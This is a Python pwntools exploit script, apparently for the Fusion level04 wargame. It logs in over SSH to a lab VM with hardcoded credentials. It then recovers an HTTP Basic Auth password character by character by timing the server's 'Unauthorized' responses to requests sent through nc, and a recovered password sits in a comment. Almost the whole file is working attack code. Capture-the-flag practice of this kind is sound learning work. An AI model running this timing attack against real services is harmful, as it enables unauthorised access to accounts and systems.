from pwn import *
import base64
from pwnhelper import *
import itertools
import sys
import datetime




local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


s = connect("04")


def recv_all(p):
    while True:
        data = p.recv().decode("utf-8")
        log.warn(f"new data: \n{data}\n\n")

debug = False
if len(sys.argv) > 1:
    debug = True

s = connect("04")



first_range = range(97, 97+25)
second_range = range(65, 65 + 25)
third_range = range(48, 48 + 9)
# for i in first_range:
#     for j in second_range:
#         for k in third_range:

result = b""

threshold = 1800

def recv_and_check(nc, before):
    after = None
    while True:
        try:
            data = nc.recv().decode("utf-8")
            if "Unauthorized" in data:
                after = datetime.datetime.now()
                break
        except EOFError:
            break
    nc.close()
    if after is None:
        log.warn("did not receive Unauthorized")
        return True
    delta = after - before
    log.info(f"time delta: {delta.microseconds}")
    if delta.microseconds < threshold:
        return True
    else:
        return False


for j in range(16):
    log.warn("############################################################################################################################################################")
    log.warn(f"# TESTING CHAR AT POS: {j}")
    log.warn("############################################################################################################################################################")

    count = -1
    for i in itertools.chain(first_range,second_range,third_range):
        char = bytes(chr(i), "utf-8")
        log.info(f"Testing char: {char}")

        # N3gW64Qg3s756x26
        # N3gW64Qg3s756x26
        nc = s.process(["nc", "localhost", port])
        path = b"/core "
        protocol = b"HTTP/1.0"
        plain_pw = result + char + b"\x00"
        # log.info(f"plain_pw: {plain_pw}")

        password = base64.b64encode(plain_pw)

        request = b""
        request += b"GET " + path + protocol + b"\n"
        request += b"Authorization: Basic " + password + b"\n"
        request += b"\n"

        log.info(f"request: {request}")

        # nc.send("\n")
        # pw = nc.recvline()
        # log.info(f"pw: {pw}")

        # thread = threading.Thread(target=recv_all, args=(nc,))
        # thread.start()
        # time.sleep(0.5)

        nc.send(request)
        before = datetime.datetime.now()
        correct_char = recv_and_check(nc, before)
        if correct_char:
            log.warn(f"found right char {char}")
            result += char
            log.warn(f"curr pw {result}")
            count = i
            break
    if count == -1:
        log.error(f"did not find char at pos {j}")
        exit(1)

log.info(f"pw: {result}")

# r = nc.recvall()
# log.info(f"r: {r}")
